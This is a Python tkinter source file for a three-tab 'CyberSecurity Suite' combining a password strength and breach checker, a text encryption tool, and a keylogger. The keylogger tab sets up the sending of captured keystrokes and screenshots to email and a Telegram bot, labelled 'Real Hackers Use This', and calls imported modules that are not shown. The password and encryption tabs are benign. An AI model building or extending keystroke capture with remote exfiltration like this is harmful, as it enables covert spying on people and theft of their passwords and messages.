import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading

# Import modules
from password_analyzer import check_password_strength, check_breach
from keylogger_module import Keylogger
from encryption_module import EncryptionManager

class CyberSecuritySuite:
    def __init__(self, root):
        self.root = root
        self.root.title("🔐 CyberSecurity Suite - 3 in 1")
        self.root.geometry("850x750")
        self.root.resizable(True, True)
        
        # Initialize modules
        self.keylogger = Keylogger()
        self.encryption = EncryptionManager()
        
        # Create tabs
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Tab 1: Password Analyzer
        self.tab1 = ttk.Frame(self.notebook)
        self.notebook.add(self.tab1, text="🔑 Password Analyzer")
        self.setup_password_tab()
        
        # Tab 2: Keylogger
        self.tab2 = ttk.Frame(self.notebook)
        self.notebook.add(self.tab2, text="⌨️ Keylogger")
        self.setup_keylogger_tab()
        
        # Tab 3: Encryption
        self.tab3 = ttk.Frame(self.notebook)
        self.notebook.add(self.tab3, text="🔐 Text Encryption")
        self.setup_encryption_tab()
        
        # Status bar
        self.status = tk.Label(root, text="Ready", bd=1, relief=tk.SUNKEN, anchor=tk.W)
        self.status.pack(side=tk.BOTTOM, fill=tk.X)
    
    # ============ PASSWORD ANALYZER TAB ============
    def setup_password_tab(self):
        tk.Label(self.tab1, text="🔑 Password Strength Analyzer", font=('Arial', 16, 'bold')).pack(pady=10)
        
        frame = tk.Frame(self.tab1)
        frame.pack(pady=10)
        
        tk.Label(frame, text="Enter Password:", font=('Arial', 12)).pack(side=tk.LEFT, padx=5)
        self.pw_entry = tk.Entry(frame, width=30, font=('Arial', 12), show="*")
        self.pw_entry.pack(side=tk.LEFT, padx=5)
        
        self.show_btn = tk.Button(frame, text="👁️ Show", command=self.toggle_password_visibility)
        self.show_btn.pack(side=tk.LEFT, padx=5)
        
        tk.Button(self.tab1, text="🔍 Check Strength", command=self.analyze_password,
                  font=('Arial', 12), bg='#4CAF50', fg='white', padx=20).pack(pady=10)
        
        self.result_text = scrolledtext.ScrolledText(self.tab1, width=80, height=15, font=('Arial', 11))
        self.result_text.pack(pady=10, padx=20)
        self.result_text.config(state=tk.DISABLED)
    
    def toggle_password_visibility(self):
        if self.pw_entry.cget('show') == '*':
            self.pw_entry.config(show='')
            self.show_btn.config(text='🙈 Hide')
        else:
            self.pw_entry.config(show='*')
            self.show_btn.config(text='👁️ Show')
    
    def analyze_password(self):
        password = self.pw_entry.get()
        if not password:
            messagebox.showwarning("Warning", "Please enter a password!")
            return
        
        strength, score, suggestions = check_password_strength(password)
        
        result = f"📊 Password Analysis Report\n"
        result += "=" * 40 + "\n"
        result += f"🔹 Password: {'*' * len(password)}\n"
        result += f"🔹 Length: {len(password)} characters\n"
        result += f"🔹 Strength: {strength} (Score: {score}/5)\n\n"
        
        if suggestions:
            result += "💡 Suggestions:\n"
            for s in suggestions:
                result += f"  {s}\n"
        else:
            result += "✅ Great! No suggestions needed.\n"
        
        result += "\n🔍 Checking breach status...\n"
        breach_status = check_breach(password)
        if breach_status is True:
            result += "⚠️ ALERT: This password has been breached! Use a different one."
        elif breach_status is False:
            result += "✅ Good! Password not found in breach database."
        else:
            result += breach_status
        
        self.result_text.config(state=tk.NORMAL)
        self.result_text.delete(1.0, tk.END)
        self.result_text.insert(tk.END, result)
        self.result_text.config(state=tk.DISABLED)
        self.status.config(text="✅ Password analysis complete!")
    
    # ============ KEYLOGGER TAB ============
    def setup_keylogger_tab(self):
        tk.Label(self.tab2, text="⌨️ Keylogger Monitor", font=('Arial', 16, 'bold')).pack(pady=10)
        
        # ========== 📧 EMAIL SETTINGS FRAME ==========
        email_frame = tk.LabelFrame(self.tab2, text="📧 Email Settings (Optional)", font=('Arial', 11, 'bold'))
        email_frame.pack(pady=5, padx=20, fill=tk.X)
        
        tk.Label(email_frame, text="Sender Email (Your Gmail):", font=('Arial', 10)).grid(row=0, column=0, padx=5, pady=3, sticky=tk.W)
        self.sender_entry = tk.Entry(email_frame, width=35, font=('Arial', 10))
        self.sender_entry.grid(row=0, column=1, padx=5, pady=3)
        self.sender_entry.insert(0, "your_email@gmail.com")
        
        tk.Label(email_frame, text="App Password (16-digit):", font=('Arial', 10)).grid(row=1, column=0, padx=5, pady=3, sticky=tk.W)
        self.password_entry = tk.Entry(email_frame, width=35, font=('Arial', 10), show="*")
        self.password_entry.grid(row=1, column=1, padx=5, pady=3)
        self.password_entry.insert(0, "abcd efgh ijkl mnop")
        
        self.show_pw_btn = tk.Button(email_frame, text="👁️", command=self.toggle_email_password, width=3)
        self.show_pw_btn.grid(row=1, column=2, padx=2, pady=3)
        
        tk.Label(email_frame, text="Receiver Email (Send to):", font=('Arial', 10)).grid(row=2, column=0, padx=5, pady=3, sticky=tk.W)
        self.receiver_entry = tk.Entry(email_frame, width=35, font=('Arial', 10))
        self.receiver_entry.grid(row=2, column=1, padx=5, pady=3)
        self.receiver_entry.insert(0, "receiver@gmail.com")
        
        self.save_email_btn = tk.Button(email_frame, text="💾 Save Email Settings", command=self.save_email_settings,
                                        font=('Arial', 10), bg='#9C27B0', fg='white', padx=15)
        self.save_email_btn.grid(row=3, column=0, columnspan=2, pady=8)
        
        # ========== 🔥 TELEGRAM STATUS FRAME ==========
        telegram_frame = tk.LabelFrame(self.tab2, text="📡 Telegram (Real Hackers Use This)", font=('Arial', 11, 'bold'))
        telegram_frame.pack(pady=5, padx=20, fill=tk.X)
        
        tk.Label(telegram_frame, text="✅ Bot Configured! Logs & Screenshots auto-sent to Telegram.",
                 font=('Arial', 10), fg='green').pack(pady=3)
        
        self.test_tg_btn = tk.Button(telegram_frame, text="📤 Test Telegram", command=self.test_telegram,
                                     font=('Arial', 10), bg='#E91E63', fg='white', padx=15)
        self.test_tg_btn.pack(pady=5)
        
        # ========== KEYLOGGER CONTROLS ==========
        frame = tk.Frame(self.tab2)
        frame.pack(pady=10)
        
        self.start_btn = tk.Button(frame, text="▶️ Start Logging", command=self.start_keylogger,
                                   font=('Arial', 11), bg='#4CAF50', fg='white', padx=15)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = tk.Button(frame, text="⏹️ Stop Logging", command=self.stop_keylogger,
                                  font=('Arial', 11), bg='#f44336', fg='white', padx=15, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        self.save_btn = tk.Button(frame, text="💾 Save Log", command=self.save_keylog,
                                  font=('Arial', 11), bg='#2196F3', fg='white', padx=15)
        self.save_btn.pack(side=tk.LEFT, padx=5)
        
        self.clear_btn = tk.Button(frame, text="🗑️ Clear", command=self.clear_keylog,
                                  font=('Arial', 11), bg='#FF9800', fg='white', padx=15)
        self.clear_btn.pack(side=tk.LEFT, padx=5)
        
        self.email_test_btn = tk.Button(frame, text="📧 Test Email", command=self.test_email,
                                   font=('Arial', 11), bg='#2196F3', fg='white', padx=15)
        self.email_test_btn.pack(side=tk.LEFT, padx=5)
        
        self.kl_status = tk.Label(self.tab2, text="⚪ Keylogger is stopped", font=('Arial', 12))
        self.kl_status.pack(pady=5)
        
        self.kl_display = scrolledtext.ScrolledText(self.tab2, width=85, height=10, font=('Courier', 10))
        self.kl_display.pack(pady=10, padx=20)
        self.kl_display.config(state=tk.DISABLED)
    
    def toggle_email_password(self):
        if self.password_entry.cget('show') == '*':
            self.password_entry.config(show='')
            self.show_pw_btn.config(text='🙈')
        else:
            self.password_entry.config(show='*')
            self.show_pw_btn.config(text='👁️')
    
    def save_email_settings(self):
        sender = self.sender_entry.get().strip()
        password = self.password_entry.get().strip()
        receiver = self.receiver_entry.get().strip()
        
        if not sender or not password or not receiver:
            messagebox.showwarning("Warning", "Please fill all email fields!")
            return
        
        if "@" not in sender or "@" not in receiver:
            messagebox.showwarning("Warning", "Please enter valid email addresses!")
            return
        
        result = self.keylogger.update_email_settings(sender, password, receiver)
        self.status.config(text=result)
        messagebox.showinfo("Success", "✅ Email settings saved!\n\nNow use Test Email or Start Logging.")
    
    def start_keylogger(self):
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.kl_status.config(text="🟢 Keylogger is RUNNING (Press ESC to stop)", fg='green')
        self.status.config(text="⌨️ Keylogger started...")
        
        threading.Thread(target=self._start_keylogger_thread, daemon=True).start()
    
    def _start_keylogger_thread(self):
        self.keylogger.start()
        self.root.after(0, lambda: self.update_keylog_display())
    
    def stop_keylogger(self):
        msg = self.keylogger.stop()
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.kl_status.config(text="🔴 Keylogger STOPPED - 📤 Sent to Telegram!", fg='red')
        self.status.config(text="📤 Logs + Screenshot sent to Telegram!")
        self.update_keylog_display()
        
        messagebox.showinfo("✅ Keylogger Stopped",
                           "📸 Screenshot captured!\n"
                           "📤 Logs sent to Telegram!\n"
                           "📧 Email sent (if configured)!\n\n"
                           "Check your Telegram app.\n"
                           "Files saved: keylog.txt, screenshot.png")
    
    def update_keylog_display(self):
        self.kl_display.config(state=tk.NORMAL)
        self.kl_display.delete(1.0, tk.END)
        self.kl_display.insert(tk.END, self.keylogger.get_log())
        self.kl_display.config(state=tk.DISABLED)
        self.root.after(1000, self.update_keylog_display)
    
    def save_keylog(self):
        if self.keylogger.log:
            self.keylogger.save_log()
            self.status.config(text="💾 Keylog saved!")
            messagebox.showinfo("Success", "Keylog saved to keylog.txt")
        else:
            messagebox.showwarning("Warning", "No keystrokes to save!")
    
    def clear_keylog(self):
        self.keylogger.log = []
        self.kl_display.config(state=tk.NORMAL)
        self.kl_display.delete(1.0, tk.END)
        self.kl_display.config(state=tk.DISABLED)
        self.status.config(text="🗑️ Log cleared")
    
    # ========== 🔥 TEST FUNCTIONS ==========
    
    def test_email(self):
        if not self.keylogger.email_sender:
            messagebox.showwarning("Warning", "Please save email settings first!")
            return
        
        self.status.config(text="📧 Sending test email...")
        result = self.keylogger.send_log_via_email()
        self.status.config(text=result)
        messagebox.showinfo("Email Test", result)
    
    def test_telegram(self):
        """Test Telegram Bot"""
        self.status.config(text="📤 Testing Telegram...")
        result = self.keylogger.test_telegram()
        if result:
            messagebox.showinfo("✅ Success", "Telegram working! Check your Telegram app.")
            self.status.config(text="✅ Telegram test successful!")
        else:
            messagebox.showerror("❌ Failed", "Telegram test failed! Check token and chat ID.")
            self.status.config(text="❌ Telegram test failed!")
    
    # ============ ENCRYPTION TAB ============
    def setup_encryption_tab(self):
        tk.Label(self.tab3, text="🔐 Text Encryption Suite", font=('Arial', 16, 'bold')).pack(pady=10)
        
        frame1 = tk.Frame(self.tab3)
        frame1.pack(pady=5)
        
        tk.Label(frame1, text="Algorithm:", font=('Arial', 12)).pack(side=tk.LEFT, padx=5)
        self.algo_var = tk.StringVar(value="AES")
        algo_menu = ttk.Combobox(frame1, textvariable=self.algo_var, values=["AES", "DES", "RSA"],
                                 state="readonly", width=10, font=('Arial', 11))
        algo_menu.pack(side=tk.LEFT, padx=5)
        
        tk.Label(self.tab3, text="Input Text:", font=('Arial', 11)).pack(anchor=tk.W, padx=30)
        self.enc_input = scrolledtext.ScrolledText(self.tab3, width=80, height=5, font=('Courier', 11))
        self.enc_input.pack(pady=5, padx=20)
        
        frame2 = tk.Frame(self.tab3)
        frame2.pack(pady=10)
        
        tk.Button(frame2, text="🔒 Encrypt", command=self.encrypt_text,
                  font=('Arial', 11), bg='#4CAF50', fg='white', padx=20).pack(side=tk.LEFT, padx=5)
        
        tk.Button(frame2, text="🔓 Decrypt", command=self.decrypt_text,
                  font=('Arial', 11), bg='#2196F3', fg='white', padx=20).pack(side=tk.LEFT, padx=5)
        
        tk.Button(frame2, text="🗑️ Clear All", command=self.clear_encryption,
                  font=('Arial', 11), bg='#FF9800', fg='white', padx=15).pack(side=tk.LEFT, padx=5)
        
        tk.Label(self.tab3, text="Output:", font=('Arial', 11)).pack(anchor=tk.W, padx=30)
        self.enc_output = scrolledtext.ScrolledText(self.tab3, width=80, height=5, font=('Courier', 11))
        self.enc_output.pack(pady=5, padx=20)
    
    def encrypt_text(self):
        text = self.enc_input.get(1.0, tk.END).strip()
        if not text:
            messagebox.showwarning("Warning", "Please enter text to encrypt!")
            return
        
        algo = self.algo_var.get()
        result = ""
        
        if algo == "AES":
            result = self.encryption.encrypt_aes(text)
        elif algo == "DES":
            result = self.encryption.encrypt_des(text)
        elif algo == "RSA":
            result = self.encryption.encrypt_rsa(text)
        
        self.enc_output.config(state=tk.NORMAL)
        self.enc_output.delete(1.0, tk.END)
        self.enc_output.insert(tk.END, result)
        self.enc_output.config(state=tk.DISABLED)
        self.status.config(text=f"✅ {algo} encryption complete!")
    
    def decrypt_text(self):
        text = self.enc_output.get(1.0, tk.END).strip()
        if not text:
            messagebox.showwarning("Warning", "Please enter encrypted text to decrypt!")
            return
        
        algo = self.algo_var.get()
        result = ""
        
        if algo == "AES":
            result = self.encryption.decrypt_aes(text)
        elif algo == "DES":
            result = self.encryption.decrypt_des(text)
        elif algo == "RSA":
            result = self.encryption.decrypt_rsa(text)
        
        self.enc_input.config(state=tk.NORMAL)
        self.enc_input.delete(1.0, tk.END)
        self.enc_input.insert(tk.END, result)
        self.enc_input.config(state=tk.DISABLED)
        self.status.config(text=f"✅ {algo} decryption complete!")
    
    def clear_encryption(self):
        self.enc_input.config(state=tk.NORMAL)
        self.enc_input.delete(1.0, tk.END)
        self.enc_input.config(state=tk.DISABLED)
        self.enc_output.config(state=tk.NORMAL)
        self.enc_output.delete(1.0, tk.END)
        self.enc_output.config(state=tk.DISABLED)
        self.status.config(text="🗑️ Cleared")

if __name__ == "__main__":
    root = tk.Tk()
    app = CyberSecuritySuite(root)
    root.mainloop()
